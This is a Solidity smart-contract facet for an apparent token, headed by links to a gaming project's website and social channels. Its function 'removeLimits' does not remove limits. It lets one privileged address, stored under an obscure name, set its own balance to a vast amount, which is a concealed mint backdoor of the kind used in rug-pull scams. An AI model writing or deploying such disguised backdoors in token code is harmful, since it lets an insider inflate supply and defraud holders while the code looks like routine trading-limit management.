/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.eof.gg/?utm_source=icodrops
 * Twitter: https://twitter.com/Enginesoffury
 * Telegram: https://t.me/EnginesOfFury
 * Discord: http://discord.gg/eof
 * Youtube: https://www.youtube.com/watch?v=83vzEhRRhVI&t=1s
 */
pragma solidity ^0.8.21;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
